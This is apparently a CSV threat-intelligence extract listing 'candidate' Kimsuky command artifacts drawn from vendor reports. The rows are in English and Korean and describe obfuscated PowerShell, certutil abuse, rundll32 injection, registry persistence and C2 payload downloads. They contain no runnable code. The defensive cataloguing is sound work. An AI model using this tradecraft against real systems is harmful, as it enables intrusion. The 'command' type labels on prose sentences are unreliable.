schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:bf6eaff76dc3bb46e746987882228290e4f11d46d74b655387d49f35e90bf7a9,observation--sha256:e96d271428c56a7e1c15dbedb7eaeb7120e4b12a6a24e644d8ef791cd19b2805,command,• PowerShell - Obfuscated Script,• PowerShell - Obfuscated Script,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2619785f49bed1dc5313883580ba9be9c6a9784fbbe318b63413bce3f1e77984,observation--sha256:e5df9c23adf9e8b2d76329a6bb5c0b914cd02df3b19816e3a5756b55ac2c2711,command,"• PowerShell, BAT file, or Windows Scripting Host and simple command and control","• PowerShell, BAT file, or Windows Scripting Host and simple command and control",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0d8654b32396be91f729c411643ba63efc0e34ac4baff80d10cb85787ceead1c,observation--sha256:ceeeab9315e8d9a0b4b1a2bb52688fd4e99600e3f3d273e131248445ff5824e1,command,• Suspicious Process - CHM File Runs CMD.exe to Run Certutil,• Suspicious Process - CHM File Runs CMD.exe to Run Certutil,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bbba7ac8bfb0b9d446e878d63849ff67fab018340620b614e472f6c1554db7d1,observation--sha256:2f294e8ec2fc2656a8a28151f0b9f8f47531d74807779b10954c1d2b46fd915d,command,• Suspicious Process - PowerShell IO.MemoryStream,• Suspicious Process - PowerShell IO.MemoryStream,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:01f505c34c379aae7660e995b308d37af5f4a11e7d5e4ea339d88033ee622229,observation--sha256:3b8f829dd183d29b449546cc230fe8e1a5714f17b746062686274aff420c8f35,command,• Suspicious Process - XORed Data in PowerShell,• Suspicious Process - XORed Data in PowerShell,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:761abc2ee9d4d3d6ce4d378f378a44d7956a06dbc40547a6f7216745d87dc784,observation--sha256:6c5af15bfcdc4d3db2a26b50405fcef6c0ec9f90f5bd6bc3e5f000fc5a2f57fe,command,"• System binary proxy execution (T1218) with rundll32, regsvr32, and others.","• System binary proxy execution (T1218) with rundll32, regsvr32, and others",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 • Remote access capabilities, including exfiltration of collected data • Interest in open source .NET and custom Golang RATs • Packing and simple obfuscation techniques to mask malware from basic detection methods • Custom encryption and LOLbin techniques like automated exfil and Base64 certutil encoding A technical deep dive of all Kimsuky malware is beyond the scope of this paper, however, we have included a brief description of some of the common Windows malware for further reading and res",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ef33d146c177b9f742f50b5a06edfd2eab82f76a49f6472f1a969ae75a993eff,observation--sha256:3bbb8b57c7610e8465ee7588a219977191751d2fae15b707d7cc58e2462835f1,command,"② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed.","② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 14}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 14 VIRUS BULLETIN CONFERENCE OCTOBER 2021 And ② in case of malicious code, the encoded file inside is XOR-decoded and executed. (KEY:0xCC) 6.2 Process injection: dynamic-link library injection ② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed. 6.3 Masquerading: match legitimate name or location To hide the operation of the malware, it is disguised by u",
1.0.0,actor--kimsuky,artifact--sha256:649c7dcea895ab39aef895d15339026806a9bb0ff58664aff751eac0e3c58651,observation--sha256:9eb3bac805b8d3daa40d9c505dc09568e7a759b6eb46515101d968c777561f2f,command,"○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다.","○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 29}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4. 유사도분석(SimilarityAnalysis)4.1.타임라인(Timeline) ○ GSC 는 악성 CHM 파일의실행과정에서악용되는VBS, JSE 파일을통해유형을분류하고추적및분석을진행했습니다. ○CHM공격은현재까지지속적으로발견되고있으며, 보안솔루션의탐지및차단을피하기 위해 점차 고도화되는 양상을 띄고 있습니다. VBS 파일을 악용하는 형태로시작해최근에는JSE파일을악용하며, 점차변화하는모습을보이고있습니다. ○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다. [그림4-1] CHM공격타임라인 Genians SecurityCenter 28",
1.0.0,actor--kimsuky,artifact--sha256:7b663416d1f46439dae250ed6e57921564c45f118cc3f76f52286651cdaeb77b,observation--sha256:81225a88dac5500cbe6a663a7d2373f04124798b3706c56e5ff483660b873bb0,command,"○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다.","○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 58}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 결론및대응방법(Conclusion) ○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다. ○ CHM 공격은 주로 피싱 메일에 포함된 첨부 파일 또는 다운로드 링크를 통해이뤄지고있습니다. 따라서수신메일의발신자주소스펠링을주의깊게확인해야하고출처가 불분명한 이메일에 포함된 링크나 첨부 파일을 클릭하지 않도록 주의해야합니다. ○최근에는Microsoft 가Windows 에서의VBS 기능사용의중지를발표 하면서JSE 11 등과 같은 파일이 악용되거나 새로운 유형의 공격이 발견될 가능성이 커지고 있어주의가필요합니다. 11 Microsoft - Resources for deprecatedfeatures Genians SecurityCenter 57",
1.0.0,actor--kimsuky,artifact--sha256:5352183c0ea91ffed9d27a349e8ddc3ba2260144e291b2d239460b0283f2d132,observation--sha256:de917f361c20b08638e3707ad67c12715342a91c3b64680b5befe9fc217cce8f,command,"○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다.","○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 44}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○최종실행되는코드는아래와같습니다. 매개변수의길이가0보다클경우, 해당JSE파일을레지스트리자동실행경로에등록합니다. HTML파일의스크립트에서해당JSE파일을실행할때매개변수로“P” 를사용했기때문에조건문은참이됩니다. ○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다. [그림4-18] JSE2유형의JSE코드 [그림4-19] JSE2유형탐지 Genians SecurityCenter 43",
1.0.0,actor--kimsuky,artifact--sha256:e56de13f2e819c862c7ba06e2059b4dfeb267fe3c7cb3786e675d130135b95dc,observation--sha256:648a9ea7e1b098d34e20edea464a8083805004560f2fe6aeb875d6605552d716,command,"○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다.","○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 59}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5.1. GenianEDR제품을통한위협탐지및대응 ○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다. [그림5-1] 스토리라인흐름도 Genians SecurityCenter 58",
1.0.0,actor--kimsuky,artifact--sha256:e36d39a1e36d120e15239245a5caca44c3e2cf8982d30b598ab01b98c3d19349,observation--sha256:725d5fb4eaad3dcf28bbf8b56783fabeb50729796c7aedb94fe9fc0b94a6462e,command,"○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다.","○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 35}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다. [그림4-9] JSE1유형의DAT, JSE파일 Genians SecurityCenter 34",
1.0.0,actor--kimsuky,artifact--sha256:f03fe1f38a90eacabe6c42295a87db4bddc45983a273fc601a056d5ef749bfc8,observation--sha256:4c0b6c86bbbfde5d30e20fc8bba2aeba9164cf3874afa9c851ed35a8238f7833,command,"○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다.","○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 47}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다. [그림4-22] 악성매크로코드 ○분석시점에C2서버에접속이불가하여최종다운로드되는“smss.exe” 파일은확보하지못했지만RAT또는Backdoor 유형의악성코드로추정하고있습니다. Genians SecurityCenter 46",
1.0.0,actor--kimsuky,artifact--sha256:cdc25205baa0baaae18a7b9d4139c20ad8ee85b42ba4c8137d941f83fef13305,observation--sha256:48e7052dafa6a42446738b440ffa9b79cebc53c3ab3374db5a1af7ba6ebe2ce0,command,"○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다.","○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 51}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○해당JSE 파일은지속성을유지하기위해JSE 파일을레지스트리자동실행경로에등록합니다. 이후, Powershell 을 통해 공격자의 C2 서버에서 “alg.exe” 파일을다운로드후실행합니다. [그림4-27] JSE3유형의코드 [그림4-28] GenianEDR 을통한JSE3유형탐지 Genians SecurityCenter 50",
